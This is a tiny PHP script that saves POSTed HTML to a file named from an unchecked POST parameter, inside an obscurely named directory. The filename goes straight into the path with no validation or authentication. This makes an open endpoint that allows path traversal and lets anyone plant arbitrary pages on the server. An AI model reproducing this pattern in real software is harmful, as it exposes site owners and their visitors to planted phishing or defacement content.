<?php

if (isset($_POST['name']) && !empty($_POST['name']) && isset($_POST['html']) && !empty($_POST['html'])) {
  $fp = fopen("SMscTChAlo9NU5vqmx5kwZkRDwIcezsj/" . $_POST['name'] . ".html","wb");
  fwrite($fp, $_POST['html']);
  fclose($fp);
}
